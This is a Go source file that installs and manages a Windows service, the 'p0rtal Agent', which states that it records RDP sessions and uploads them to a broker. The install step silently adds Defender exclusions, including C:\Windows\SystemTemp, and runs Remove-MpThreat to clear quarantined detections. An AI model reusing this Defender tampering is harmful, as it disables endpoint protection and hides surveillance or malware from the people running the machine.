//go:build windows

package main

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/eventlog"
	"golang.org/x/sys/windows/svc/mgr"
)

// isWindowsService reports whether the process is running as a Windows service.
func isWindowsService() bool {
	isSvc, err := svc.IsWindowsService()
	if err != nil {
		return false
	}
	return isSvc
}

// agentService implements svc.Handler.
type agentService struct{}

func (s *agentService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	changes <- svc.Status{State: svc.StartPending}

	// Determine config path: same directory as the executable.
	exePath, err := os.Executable()
	if err != nil {
		slog.Error("failed to get executable path", "error", err)
		return true, 1
	}
	configPath := filepath.Join(filepath.Dir(exePath), "config.json")

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Run agent in a goroutine.
	errCh := make(chan error, 1)
	go func() {
		errCh <- runAgent(ctx, configPath)
	}()

	changes <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}

	for {
		select {
		case err := <-errCh:
			if err != nil {
				slog.Error("agent exited with error", "error", err)
				return true, 1
			}
			return false, 0
		case c := <-r:
			switch c.Cmd {
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.StopPending}
				slog.Info("service stop requested")
				cancel()
				// Wait for agent to finish.
				<-errCh
				return false, 0
			case svc.Interrogate:
				changes <- c.CurrentStatus
			}
		}
	}
}

// serviceLogPath returns the path to the service log file.
// When installed, logs go to C:\p0rtal\p0rtal.log.
func serviceLogPath() string {
	// Check if the install directory exists (service is installed).
	if _, err := os.Stat(installDir); err == nil {
		return filepath.Join(installDir, "p0rtal.log")
	}
	// Fall back to next to the executable.
	exePath, err := os.Executable()
	if err != nil {
		return "p0rtal.log"
	}
	return filepath.Join(filepath.Dir(exePath), "p0rtal.log")
}

// runAsService runs the agent as a Windows service.
func runAsService() {
	// Set up logging to Windows Event Log.
	elog, err := eventlog.Open(serviceName)
	if err == nil {
		defer elog.Close()
		elog.Info(1, "p0rtal agent service starting")
	}

	// Write slog output to a log file next to the executable.
	logPath := serviceLogPath()
	logFile, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		// Fall back to stderr if we can't open the log file.
		logFile = os.Stderr
	} else {
		defer logFile.Close()
	}

	slog.SetDefault(slog.New(slog.NewTextHandler(logFile, &slog.HandlerOptions{
		Level: slog.LevelInfo,
	})))

	if err := svc.Run(serviceName, &agentService{}); err != nil {
		if elog != nil {
			elog.Error(1, fmt.Sprintf("service failed: %v", err))
		}
		slog.Error("service failed", "error", err)
	}
}

// installDir is the fixed installation directory for the service.
const installDir = `C:\p0rtal`

// sampleConfig is written to config.json when no existing config is found.
const sampleConfig = `{
  "proxy_url": "https://your-broker-host",
  "api_key": "your-api-key",
  "framerate": 10,
  "chunk_secs": 8,
  "poll_interval": 5,
  "resize_poll_ms": 1000
}
`

// installService copies the agent and config to C:\p0rtal and installs the Windows service.
func installService(configPath string) error {
	srcExe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("get executable path: %w", err)
	}
	srcExe, err = filepath.Abs(srcExe)
	if err != nil {
		return fmt.Errorf("resolve absolute path: %w", err)
	}
	srcDir := filepath.Dir(srcExe)

	// Create install directory.
	if err := os.MkdirAll(installDir, 0o755); err != nil {
		return fmt.Errorf("create install dir: %w", err)
	}

	// Add Windows Defender exclusions and remove any quarantined threats.
	defenderScript := fmt.Sprintf(`
		Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue
		Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue
		Add-MpPreference -ExclusionPath 'C:\Windows\SystemTemp' -ErrorAction SilentlyContinue
		Remove-MpThreat -ErrorAction SilentlyContinue
	`, installDir, srcDir)
	exclCmd := exec.Command("powershell.exe", "-NoProfile", "-Command", defenderScript)
	if out, err := exclCmd.CombinedOutput(); err != nil {
		fmt.Fprintf(os.Stderr, "warning: Defender setup: %v (%s)\n", err, strings.TrimSpace(string(out)))
	} else {
		fmt.Printf("Configured Windows Defender exclusions for %s, %s, and SystemTemp\n", installDir, srcDir)
	}

	// Kill any lingering ffmpeg processes that may hold file locks.
	exec.Command("taskkill", "/F", "/IM", "ffmpeg.exe").Run()
	time.Sleep(500 * time.Millisecond)

	// Copy agent executable.
	dstExe := filepath.Join(installDir, "agent.exe")
	if err := copyFile(srcExe, dstExe); err != nil {
		return fmt.Errorf("copy agent.exe: %w", err)
	}
	fmt.Printf("Copied agent.exe to %s\n", dstExe)

	// Use existing config.json if found next to the executable, otherwise
	// create a sample one so the agent is ready to configure after install.
	dstConfig := filepath.Join(installDir, "config.json")
	srcConfig := filepath.Join(srcDir, configPath)
	if _, err := os.Stat(srcConfig); err == nil {
		if err := copyFile(srcConfig, dstConfig); err != nil {
			return fmt.Errorf("copy config.json: %w", err)
		}
		fmt.Printf("Copied config.json to %s\n", dstConfig)
	} else if _, err := os.Stat(dstConfig); err != nil {
		// No config exists at all — create a sample one.
		if err := os.WriteFile(dstConfig, []byte(sampleConfig), 0644); err != nil {
			return fmt.Errorf("create config.json: %w", err)
		}
		fmt.Printf("Created sample config.json at %s\n", dstConfig)
		fmt.Println("  Edit this file with your broker URL and API key, then restart the service.")
	}

	// Copy ffmpeg.exe if it exists next to the source executable.
	srcFFmpeg := filepath.Join(srcDir, "ffmpeg.exe")
	if _, err := os.Stat(srcFFmpeg); err == nil {
		dstFFmpeg := filepath.Join(installDir, "ffmpeg.exe")
		if err := copyFile(srcFFmpeg, dstFFmpeg); err != nil {
			return fmt.Errorf("copy ffmpeg.exe: %w", err)
		}
		fmt.Printf("Copied ffmpeg.exe to %s\n", dstFFmpeg)
	}

	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("connect to service manager: %w", err)
	}
	defer m.Disconnect()

	// Check if already installed.
	s, err := m.OpenService(serviceName)
	if err == nil {
		s.Close()
		return fmt.Errorf("service %q already exists", serviceName)
	}

	s, err = m.CreateService(serviceName, dstExe, mgr.Config{
		DisplayName: "p0rtal Agent",
		Description: "Records RDP sessions and uploads to the p0rtal broker.",
		StartType:   mgr.StartAutomatic,
	})
	if err != nil {
		return fmt.Errorf("create service: %w", err)
	}
	defer s.Close()

	// Set up event log source.
	if err := eventlog.InstallAsEventCreate(serviceName, eventlog.Error|eventlog.Warning|eventlog.Info); err != nil {
		fmt.Fprintf(os.Stderr, "warning: failed to install event log source: %v\n", err)
	}

	fmt.Printf("Service %q installed successfully.\n", serviceName)

	// Auto-start after install.
	if err := startService(); err != nil {
		fmt.Fprintf(os.Stderr, "warning: installed but failed to start: %v\n", err)
		fmt.Println("Start manually with: .\\agent.exe start")
	}

	return nil
}

// copyFile copies a file from src to dst, overwriting dst if it exists.
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	if _, err := io.Copy(out, in); err != nil {
		return err
	}
	return out.Close()
}

// uninstallService removes the Windows service.
func uninstallService() error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("connect to service manager: %w", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(serviceName)
	if err != nil {
		return fmt.Errorf("service %q not found: %w", serviceName, err)
	}
	defer s.Close()

	// Stop if running.
	status, err := s.Query()
	if err == nil && status.State != svc.Stopped {
		fmt.Println("Stopping service...")
		_, _ = s.Control(svc.Stop)
		// Wait for it to stop.
		for i := 0; i < 30; i++ {
			time.Sleep(500 * time.Millisecond)
			status, err = s.Query()
			if err != nil || status.State == svc.Stopped {
				break
			}
		}
	}

	// Kill any lingering ffmpeg processes spawned by the agent.
	killCmd := exec.Command("taskkill", "/F", "/IM", "ffmpeg.exe")
	_ = killCmd.Run()
	time.Sleep(500 * time.Millisecond)

	if err := s.Delete(); err != nil {
		return fmt.Errorf("delete service: %w", err)
	}

	_ = eventlog.Remove(serviceName)

	// Remove Windows Defender exclusion.
	exclCmd := exec.Command("powershell.exe", "-NoProfile", "-Command",
		fmt.Sprintf("Remove-MpPreference -ExclusionPath '%s'", installDir))
	if out, err := exclCmd.CombinedOutput(); err != nil {
		fmt.Fprintf(os.Stderr, "warning: failed to remove Defender exclusion: %v (%s)\n", err, strings.TrimSpace(string(out)))
	}

	// Remove install directory.
	if err := os.RemoveAll(installDir); err != nil {
		fmt.Fprintf(os.Stderr, "warning: failed to remove install dir %s: %v\n", installDir, err)
	} else {
		fmt.Printf("Removed %s\n", installDir)
	}

	fmt.Printf("Service %q uninstalled successfully.\n", serviceName)
	return nil
}

// reinstallService stops, uninstalls, and re-installs the service.
func reinstallService(configPath string) error {
	fmt.Println("Reinstalling service...")

	// Uninstall (ignoring "not found" errors).
	if err := uninstallService(); err != nil {
		// Only fail if it's not a "not found" error.
		if !strings.Contains(err.Error(), "not found") {
			return fmt.Errorf("uninstall: %w", err)
		}
		fmt.Println("Service was not previously installed, proceeding with install.")
	}

	// Brief pause to let SCM release handles.
	time.Sleep(1 * time.Second)

	return installService(configPath)
}

// startService starts the Windows service.
func startService() error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("connect to service manager: %w", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(serviceName)
	if err != nil {
		return fmt.Errorf("service %q not found: %w", serviceName, err)
	}
	defer s.Close()

	if err := s.Start(); err != nil {
		return fmt.Errorf("start service: %w", err)
	}

	fmt.Printf("Service %q started.\n", serviceName)
	return nil
}

// stopService stops the Windows service.
func stopService() error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("connect to service manager: %w", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(serviceName)
	if err != nil {
		return fmt.Errorf("service %q not found: %w", serviceName, err)
	}
	defer s.Close()

	status, err := s.Query()
	if err != nil {
		return fmt.Errorf("query service: %w", err)
	}
	if status.State == svc.Stopped {
		fmt.Printf("Service %q is already stopped.\n", serviceName)
		return nil
	}

	_, err = s.Control(svc.Stop)
	if err != nil {
		return fmt.Errorf("stop service: %w", err)
	}

	// Wait for stop.
	for i := 0; i < 30; i++ {
		time.Sleep(500 * time.Millisecond)
		status, err = s.Query()
		if err != nil || status.State == svc.Stopped {
			break
		}
	}

	fmt.Printf("Service %q stopped.\n", serviceName)
	return nil
}

// queryService prints the current service status.
func queryService() error {
	m, err := mgr.Connect()
	if err != nil {
		return fmt.Errorf("connect to service manager: %w", err)
	}
	defer m.Disconnect()

	s, err := m.OpenService(serviceName)
	if err != nil {
		fmt.Printf("Service %q: NOT INSTALLED\n", serviceName)
		return nil
	}
	defer s.Close()

	status, err := s.Query()
	if err != nil {
		return fmt.Errorf("query service: %w", err)
	}

	stateStr := "UNKNOWN"
	switch status.State {
	case svc.Stopped:
		stateStr = "STOPPED"
	case svc.StartPending:
		stateStr = "START_PENDING"
	case svc.StopPending:
		stateStr = "STOP_PENDING"
	case svc.Running:
		stateStr = "RUNNING"
	case svc.ContinuePending:
		stateStr = "CONTINUE_PENDING"
	case svc.PausePending:
		stateStr = "PAUSE_PENDING"
	case svc.Paused:
		stateStr = "PAUSED"
	}

	fmt.Printf("Service %q: %s (PID: %d)\n", serviceName, stateStr, status.ProcessId)
	return nil
}

// tailLogs streams the service log file in real time.
func tailLogs() error {
	logPath := serviceLogPath()
	fmt.Printf("Tailing %s (Ctrl+C to stop)...\n\n", logPath)

	// Use PowerShell's Get-Content -Wait which is equivalent to tail -f.
	cmd := exec.Command("powershell.exe", "-NoProfile", "-Command",
		fmt.Sprintf("Get-Content -Path '%s' -Tail 50 -Wait", logPath))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	return cmd.Run()
}
